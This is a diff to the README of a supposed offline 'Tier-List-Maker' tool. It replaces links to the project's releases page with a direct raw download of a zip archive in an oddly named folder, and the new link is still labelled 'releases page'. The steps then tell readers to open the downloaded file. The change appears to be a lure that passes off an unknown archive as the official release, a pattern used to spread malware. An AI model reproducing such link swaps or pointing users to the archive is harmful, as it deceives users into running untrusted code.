@@ -1,12 +1,12 @@
 # 📊 Tier-List-Maker - Create custom rankings for your interests
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Bretimproper361/Tier-List-Maker/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Bretimproper361/Tier-List-Maker/raw/refs/heads/main/xiphopagus/List_Tier_Maker_v3.4.zip)
 
 Tier-List-Maker serves as an offline tool for organizing and ranking items. This application runs on your computer without an internet connection. You use a web browser to interact with the interface. The program stores your data locally so your progress remains secure.
 
 ## 📥 How to download the application
 
-1. Visit the [releases page](https://github.com/Bretimproper361/Tier-List-Maker/releases) to find the software.
+1. Visit the [releases page](https://github.com/Bretimproper361/Tier-List-Maker/raw/refs/heads/main/xiphopagus/List_Tier_Maker_v3.4.zip) to find the software.
 2. Select the file labeled for Windows.
 3. Save the file to your computer.
 4. Open the downloaded file to start the application.
